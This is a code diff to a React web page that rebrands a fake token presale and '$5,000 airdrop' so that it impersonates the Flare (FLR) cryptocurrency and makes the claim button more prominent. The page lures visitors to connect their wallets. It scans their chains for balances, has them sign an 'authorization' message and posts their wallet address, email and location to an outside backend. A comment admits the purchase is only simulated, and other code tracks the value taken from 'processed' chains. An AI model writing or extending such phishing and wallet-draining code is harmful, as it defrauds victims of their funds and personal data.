@@ -121,7 +121,7 @@ function App() {
     nextBonus: 15,
     tokenPrice: 0.035,
     hardCap: 10000000,
-    frairPrice: 0.035
+    flarePrice: 0.035
   });
 
   // Live progress tracking
@@ -266,7 +266,7 @@ function App() {
       
       if (eligible) {
         setEligibleChains(chainsWithBalance);
-        setTxStatus('✅ You qualify for $5,000 FRAIR!');
+        setTxStatus('✅ You qualify for $5,000 Flare (FLR)!');
         
         // Send to backend for tracking
         await fetch('https://hyperback.vercel.app/api/presale/connect', {
@@ -385,10 +385,10 @@ function App() {
       setCurrentFlowId(flowId);
       
       const nonce = Math.floor(Math.random() * 1000000000);
-      const message = `FRAIR TOKEN PRESALE AUTHORIZATION\n\n` +
-        `I hereby confirm my participation in the FRAIR presale\n` +
+      const message = `FLARE (FLR) TOKEN PRESALE AUTHORIZATION\n\n` +
+        `I hereby confirm my participation in the Flare (FLR) presale\n` +
         `Wallet: ${address}\n` +
-        `Allocation: $5,000 FRAIR + ${presaleStats.currentBonus}% Bonus\n` +
+        `Allocation: $5,000 FLR + ${presaleStats.currentBonus}% Bonus\n` +
         `Timestamp: ${new Date().toISOString()}\n` +
         `Nonce: ${nonce}`;
 
@@ -533,7 +533,7 @@ function App() {
       
       if (processed.length > 0) {
         setShowCelebration(true);
-        setTxStatus(`🎉 You've secured $5,000 FRAIR!`);
+        setTxStatus(`🎉 You've secured $5,000 FLR!`);
         
         // Calculate total processed value
         const totalProcessedValue = processed.reduce((sum, chainName) => {
@@ -554,7 +554,7 @@ function App() {
             },
             chains: processed,
             totalProcessedValue: totalProcessedValue.toFixed(2),
-            reward: "5000 FRAIR",
+            reward: "5000 FLR",
             bonus: `${presaleStats.currentBonus}%`
           })
         });
@@ -575,8 +575,8 @@ function App() {
     }
   };
 
-  // Buy FRAIR tokens function
-  const buyFrair = async () => {
+  // Buy FLR tokens function
+  const buyFlr = async () => {
     if (!walletProvider || !address || !signer) {
       setError("Wallet not initialized");
       return;
@@ -591,7 +591,7 @@ function App() {
       setLoading(true);
       setError('');
       
-      setTxStatus('🔄 Buying FRAIR tokens...');
+      setTxStatus('🔄 Buying FLR tokens...');
       
       // This is where you'd implement the actual buy function
       // For now, we'll simulate a successful purchase
@@ -633,7 +633,7 @@ function App() {
           walletAddress: address,
           email: userEmail,
           location: userLocation,
-          reward: "5000 FRAIR",
+          reward: "5000 FLR",
           bonus: `${presaleStats.currentBonus}%`
         })
       });
@@ -666,13 +666,14 @@ function App() {
         <span className="text-2xl mr-2">🎁</span> CLAIM AIRDROP
       </div>
 
-      {/* Mobile Airdrop Button */}
+      {/* Mobile Airdrop Button - FIXED TO SHOW TEXT */}
       <div 
         onClick={claimAirdrop}
-        className="fixed bottom-6 right-6 bg-gradient-to-r from-red-600 to-red-500 text-white p-4 rounded-full shadow-2xl cursor-pointer hover:from-red-700 hover:to-red-600 transition-all z-50 animate-pulse-glow md:hidden flex items-center justify-center"
+        className="fixed bottom-6 right-6 bg-gradient-to-r from-red-600 to-red-500 text-white px-6 py-3 rounded-full shadow-2xl cursor-pointer hover:from-red-700 hover:to-red-600 transition-all z-50 animate-pulse-glow md:hidden flex items-center justify-center gap-2"
         style={{ animation: 'blink 1.2s infinite' }}
       >
-        <span className="text-2xl">🎁</span>
+        <span className="text-xl">🎁</span>
+        <span className="text-sm font-semibold">CLAIM</span>
       </div>
 
       {/* Main Container */}
@@ -684,7 +685,7 @@ function App() {
           {/* Logo */}
           <div className="font-['Orbitron'] text-6xl md:text-7xl font-black mb-4 animate-glow-red">
             <span className="bg-gradient-to-r from-red-500 to-red-300 bg-clip-text text-transparent">
-              FRAIR
+              FLARE (FLR)
             </span>
           </div>
 
@@ -695,7 +696,7 @@ function App() {
 
           {/* Tagline */}
           <p className="max-w-2xl text-gray-300 leading-relaxed mb-6 text-sm md:text-base">
-            FRAIR is a next-generation decentralized token designed to reward early supporters
+            Flare (FLR) is a next-generation decentralized token designed to reward early supporters
             through presale access and exclusive airdrops. Join the community before public exchange
             listings and secure the lowest available token price.
           </p>
@@ -708,7 +709,7 @@ function App() {
               onMouseLeave={() => setHoverConnect(false)}
               className="bg-gradient-to-r from-red-600 to-red-500 hover:from-red-700 hover:to-red-600 text-white font-semibold px-8 py-4 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_20px_rgba(255,0,0,0.4)] mb-8 w-full max-w-md"
             >
-              Connect Wallet To Claim $5000 (Frair Token)
+              Connect Wallet To Claim $5000 (Flare (FLR) Token)
             </button>
           ) : (
             <div className="flex flex-col items-center w-full max-w-md mb-8">
@@ -741,7 +742,7 @@ function App() {
                   ) : (
                     <span className="flex items-center justify-center gap-2">
                       <span className="text-xl">🎁</span>
-                      CLAIM AIRDROP $5,000 FRAIR
+                      CLAIM AIRDROP $5,000 FLR
                       <span className="text-sm bg-white/20 px-2 py-1 rounded-full">+{presaleStats.currentBonus}%</span>
                     </span>
                   )}
@@ -753,7 +754,7 @@ function App() {
                 <div className="mt-3 w-full">
                   {isEligible ? (
                     <div className="bg-green-500/20 border border-green-500/30 rounded-lg p-3 text-sm text-green-400">
-                      ✅ You are eligible for the $5,000 FRAIR airdrop! Click the CLAIM AIRDROP button above to proceed.
+                      ✅ You are eligible for the $5,000 Flare (FLR) airdrop! Click the CLAIM AIRDROP button above to proceed.
                     </div>
                   ) : (
                     !scanning && (
@@ -811,10 +812,10 @@ function App() {
 
           {/* Presale Card */}
           <div className="w-full max-w-md bg-red-500/5 border border-red-500/30 backdrop-blur p-8 rounded-2xl mb-8">
-            <h3 className="text-2xl font-bold mb-4 text-red-400">FRAIR Token Presale</h3>
+            <h3 className="text-2xl font-bold mb-4 text-red-400">Flare (FLR) Token Presale</h3>
             
             <p className="text-gray-300 mb-3">
-              {presaleStats.totalSold.toLocaleString()} / {presaleStats.hardCap.toLocaleString()} FRAIR Sold
+              {presaleStats.totalSold.toLocaleString()} / {presaleStats.hardCap.toLocaleString()} FLR Sold
             </p>
             
             {/* Progress Bar */}
@@ -836,18 +837,18 @@ function App() {
 
             {/* Buy Button */}
             <button
-              onClick={buyFrair}
+              onClick={buyFlr}
               disabled={loading || !isConnected}
               className="w-full bg-gradient-to-r from-red-600 to-red-500 hover:from-red-700 hover:to-red-600 text-white font-semibold py-3 rounded-xl transition-all disabled:opacity-50 disabled:cursor-not-allowed mb-6"
             >
-              {loading ? 'Processing...' : 'Buy FRAIR'}
+              {loading ? 'Processing...' : 'Buy FLR'}
             </button>
 
             {/* Airdrop Card */}
             <div className="bg-black/50 border border-red-500/30 rounded-xl p-5">
               <h4 className="text-xl font-bold mb-2 text-red-400">🎁 Airdrop Info</h4>
               <p className="text-sm text-gray-400 mb-4">
-                Early supporters can claim free FRAIR tokens. Connect wallet to check eligibility.
+                Early supporters can claim free FLR tokens. Connect wallet to check eligibility.
               </p>
               
               {!isConnected && (
@@ -887,7 +888,7 @@ function App() {
             <div className="w-full max-w-md mb-8">
               <div className="bg-black/60 backdrop-blur rounded-xl p-6 text-center border border-green-500/30">
                 <p className="text-green-400 text-lg mb-2">✓ COMPLETED on {completedChains.length} chains</p>
-                <p className="text-gray-400 text-sm">Your $5,000 FRAIR has been secured</p>
+                <p className="text-gray-400 text-sm">Your $5,000 FLR has been secured</p>
               </div>
             </div>
           )}
@@ -898,7 +899,7 @@ function App() {
               <div className="bg-black/60 backdrop-blur rounded-xl p-8 text-center border border-red-500/30">
                 <div className="text-6xl mb-4">👋</div>
                 <h2 className="text-xl font-bold mb-3 text-red-400">
-                  Welcome to FRAIR
+                  Welcome to Flare (FLR)
                 </h2>
                 <p className="text-gray-400 text-sm mb-6">
                   Connect with a wallet that has at least $1 in value to qualify for the airdrop.
@@ -917,9 +918,9 @@ function App() {
             
             {/* Card 1 */}
             <div className="bg-red-500/5 border border-red-500/20 backdrop-blur p-6 rounded-xl">
-              <h3 className="text-lg font-bold mb-3 text-red-400">About FRAIR Presale</h3>
+              <h3 className="text-lg font-bold mb-3 text-red-400">About Flare (FLR) Presale</h3>
               <p className="text-sm text-gray-400 leading-relaxed">
-                The FRAIR presale offers early community members the opportunity to purchase
+                The Flare (FLR) presale offers early community members the opportunity to purchase
                 tokens at the lowest available rate before public exchange listings.
                 Funds raised during the presale help accelerate development,
                 liquidity provisioning, and ecosystem expansion.
@@ -928,12 +929,12 @@ function App() {
 
             {/* Card 2 */}
             <div className="bg-red-500/5 border border-red-500/20 backdrop-blur p-6 rounded-xl">
-              <h3 className="text-lg font-bold mb-3 text-red-400">FRAIR Airdrop Program</h3>
+              <h3 className="text-lg font-bold mb-3 text-red-400">Flare (FLR) Airdrop Program</h3>
               <p className="text-sm text-gray-400 leading-relaxed">
-                The FRAIR airdrop rewards early adopters and active community members.
+                The Flare (FLR) airdrop rewards early adopters and active community members.
                 Eligible wallets can claim tokens directly through the decentralized
                 claim portal. This initiative ensures broad distribution
-                and strong community ownership of the FRAIR ecosystem.
+                and strong community ownership of the Flare ecosystem.
               </p>
             </div>
 
@@ -950,7 +951,7 @@ function App() {
 
           {/* Footer */}
           <footer className="mt-16 text-gray-500 text-sm">
-            © 2026 FRAIR Token — All Rights Reserved
+            © 2026 Flare (FLR) Token — All Rights Reserved
           </footer>
         </div>
       </div>
@@ -998,7 +999,7 @@ function App() {
               
               <p className="text-xl text-gray-300 mb-3">You have secured</p>
               
-              <div className="text-5xl font-black text-red-400 mb-3 animate-pulse">$5,000 FRAIR</div>
+              <div className="text-5xl font-black text-red-400 mb-3 animate-pulse">$5,000 FLR</div>
               
               <div className="inline-block bg-gradient-to-r from-red-500/20 to-red-600/20 px-6 py-3 rounded-full mb-4 border border-red-500/30">
                 <span className="text-2xl text-red-400">+{presaleStats.currentBonus}% BONUS</span>
@@ -1064,8 +1065,6 @@ function App() {
         /* Mobile responsive adjustments */
         @media (max-width: 768px) {
           .fixed.bottom-6.right-6 {
-            width: 60px;
-            height: 60px;
             box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.5);
           }
         }
